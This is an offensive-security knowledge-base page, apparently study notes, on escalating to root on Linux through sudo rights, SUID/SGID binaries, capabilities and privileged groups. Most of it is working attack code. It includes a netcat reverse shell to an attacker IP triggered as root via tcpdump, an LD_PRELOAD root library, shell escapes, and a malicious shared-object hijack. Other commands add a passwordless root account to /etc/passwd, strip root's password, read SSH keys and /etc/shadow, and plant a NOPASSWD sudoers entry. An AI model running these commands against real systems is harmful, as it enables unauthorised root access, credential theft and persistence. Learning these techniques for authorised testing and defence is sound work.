---
tags: [attack, attack/privesc]
module: linux_privilege_escalation
last_updated: 2026-05-10
source_count: 4
---

# Linux Privilege Escalation — Sudo, SUID/SGID, and Capabilities

Detailed techniques for exploiting misconfigured sudo rights, SUID/SGID binaries, and Linux capabilities to escalate to root.

## Overview

These three mechanisms all grant elevated privileges to processes — the difference is how. Sudo delegates specific root-level commands to users. SUID/SGID bits on executables make them run as the file owner (typically root). Capabilities allow fine-grained kernel privileges to be assigned to individual binaries. Misconfigurations in any of these are among the most reliable privilege escalation paths.

## Key Concepts / Techniques

### Sudo Rights Abuse

`sudo -l` lists all commands a user can run with elevated privileges. This should be the very first check after gaining access. Pay close attention to:
- `NOPASSWD` entries — no password required
- Commands allowing subshells or file access (editors, interpreters, file managers)
- Commands with the `-z` / postrotate-command pattern (`tcpdump`)
- Relative paths in sudoers — exploitable via PATH abuse

**The GTFOBins workflow:**
1. Run `sudo -l`
2. Identify any allowed binary at https://gtfobins.github.io
3. Look for the "sudo" section of that binary's entry
4. Execute the listed escape sequence

**tcpdump postrotate-command abuse:**

When `/usr/sbin/tcpdump` is in sudoers, the `-z` flag specifies a command to execute on each capture file:

```bash
# Create a reverse shell payload
cat /tmp/.test
# Contents:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.3 443 >/tmp/f

# Start listener on attack host
nc -lnvp 443

# Trigger execution as root
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Note: AppArmor on recent Ubuntu systems may prevent this by restricting the postrotate-command.

**LD_PRELOAD abuse (when env_keep+=LD_PRELOAD):**

If sudoers retains `LD_PRELOAD`, compile a shared library that executes `/bin/bash` and specify it when running any allowed sudo command:

```bash
# Check for env_keep+=LD_PRELOAD in sudo -l output

# Compile the library
cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

# Run any allowed sudo command with the preloaded library
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### SUID / SGID Binaries

SUID (Set-UID) binaries execute with the privileges of the file owner. If `root` owns an SUID binary and that binary can spawn a shell or read/write arbitrary files, it escalates to root.

**Finding SUID/SGID binaries:**

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null

# SGID
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm /6000 -type f 2>/dev/null

# With verbose output
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

**Exploiting SUID binaries (GTFOBins patterns):**

```bash
# vim (SUID)
vim -c ':!/bin/bash'

# find (SUID)
find . -exec /bin/bash -p \; -quit

# python (SUID)
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# cp (SUID) — overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
su root2

# awk (SUID)
awk 'BEGIN {system("/bin/bash -p")}'

# nano (SUID) — edit /etc/passwd
nano /etc/passwd
```

The `-p` flag to bash is important: without it, bash drops SUID privileges.

**Shared Object Hijacking (SUID binary with writable RUNPATH):**

If a SUID binary loads a shared library from a world-writable directory, plant a malicious `.so`:

```bash
# Check SUID binary dependencies
ldd /usr/local/bin/payroll

# Find the RUNPATH
readelf -d /usr/local/bin/payroll | grep PATH

# Confirm the path is writable
ls -la /development/

# Find the function name the binary calls
./payroll
# Error: undefined symbol: dbquery

# Compile a malicious shared object implementing that function
cat > /tmp/src.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void dbquery() {
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc src.c -fPIC -shared -o /development/libshared.so

# Execute the SUID binary
./payroll   # drops root shell
```

### Linux Capabilities

Capabilities are a granular version of root privileges. They can be assigned to binaries with `setcap` and persist without SUID. Unlike SUID, capabilities do not appear in a standard `find -perm` search.

**Key dangerous capabilities:**

| Capability | What It Allows |
|---|---|
| `cap_dac_override` | Bypass file read/write/execute permission checks |
| `cap_setuid` | Set process effective UID to any value including 0 |
| `cap_setgid` | Set process effective GID |
| `cap_sys_admin` | Wide-ranging admin operations (mount, sysctl, etc.) |
| `cap_sys_ptrace` | Attach to and debug any process |
| `cap_sys_module` | Load/unload kernel modules |

**Finding capabilities:**

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

**Exploiting cap_dac_override (vim.basic example):**

`cap_dac_override` lets the binary ignore file permissions. With `vim` having this capability, write to `/etc/passwd` to add a passwordless root account:

```bash
getcap /usr/bin/vim.basic
# Output: /usr/bin/vim.basic cap_dac_override=eip

# Remove the 'x' from root's password field (makes root have no password)
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Verify
cat /etc/passwd | head -n1
# root::0:0:root:/root:/bin/bash

# Login as root with no password
su -
```

**Exploiting cap_setuid (Python example):**

```bash
getcap /usr/bin/python3
# Output: /usr/bin/python3 cap_setuid=eip

/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Privileged Group Membership

Being in certain groups is essentially equivalent to root access:

| Group | Privilege | Attack Path |
|---|---|---|
| `sudo` | Run commands as root | `sudo su` or GTFOBins |
| `docker` | Control Docker daemon | Mount host `/` into container |
| `lxd` | Manage LXD containers | Privileged container with host filesystem mounted |
| `disk` | Raw device access | `debugfs /dev/sda1` to read entire filesystem |
| `adm` | Read all logs in `/var/log` | Log analysis for credentials/cron patterns |

**Docker group:**

```bash
id  # confirm docker group membership

# Mount host / into container, get root shell
docker run -v /root:/mnt -it ubuntu
# Inside container:
cat /mnt/.ssh/id_rsa
# Or add yourself to sudoers:
echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /mnt/../etc/sudoers
```

**Disk group:**

```bash
id  # confirm disk group membership

# Direct filesystem access
debugfs /dev/sda1
# Inside debugfs:
cat /etc/shadow
```

**LXD group** — see [[attack/linux_privesc_services]] for the full LXD container escape.

## Commands / Syntax

```bash
# Full sudo enumeration
sudo -l

# SUID enumeration
find / -perm -4000 -type f 2>/dev/null

# SGID enumeration
find / -perm -2000 -type f 2>/dev/null

# Capabilities enumeration
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Check group membership
id
groups

# Specific group members
getent group docker
getent group lxd
getent group disk
```

## Flags & Options

| Flag | Command | Meaning |
|---|---|---|
| `-l` | `sudo` | List allowed commands for current user |
| `-u #-1` | `sudo` | CVE-2019-14287: maps to UID 0 |
| `-p` | `bash` | Privileged mode: don't drop effective UID |
| `=eip` | `setcap`/`getcap` | Effective + inheritable + permitted |
| `=ep` | `setcap`/`getcap` | Effective + permitted |
| `-fPIC -shared` | `gcc` | Compile as position-independent shared object |

## Gotchas & Notes

- Always specify absolute paths in sudoers entries; relative paths allow PATH hijacking
- `env_reset` in sudoers defaults strips `LD_PRELOAD` unless `env_keep` explicitly includes it
- The `-p` bash flag is essential for SUID exploitation — without it bash resets effective UID to real UID
- GTFOBins has a "sudo", "suid", and "capabilities" tab for each binary — check all three
- `cap_dac_override` on `vim` is surprisingly common in CTF environments and some developer VMs
- CVE-2019-14287: `sudo -u #-1 <command>` maps UID -1 to 0 (root) in sudo < 1.8.28
- CVE-2021-3156: Heap overflow in sudo 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33) — see [[attack/linux_privesc_kernel]]

## Related Pages

- [[attack/linux_privilege_escalation]]
- [[attack/linux_privesc_enumeration]]
- [[attack/linux_privesc_services]]
- [[attack/linux_privesc_kernel]]
- [[tools/enumeration/linpeas]]

## Sources

- raw/linux_privilege_escalation/permission_based_privilege_escalation_sudo_rights_abuse.md
- raw/linux_privilege_escalation/permission_based_privilege_escalation_privileged_groups.md
- raw/linux_privilege_escalation/permission_based_priviledge_escalation_capabilities.md
- raw/linux_privilege_escalation/linux_internals_based_privilege_escalation_shared_libraries.md
- raw/linux_privilege_escalation/linux_internals_based_privilege_escalation_shared_object_hijacking.md
